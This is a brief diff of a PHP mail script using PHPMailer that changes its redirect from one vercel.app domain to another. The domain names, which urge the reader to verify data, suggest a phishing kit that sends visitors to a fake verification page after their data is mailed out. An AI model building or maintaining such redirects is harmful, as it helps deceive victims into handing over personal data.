@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://locy-your-data-see.vercel.app/");
+header("Location: https://more-data-veryf-now.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
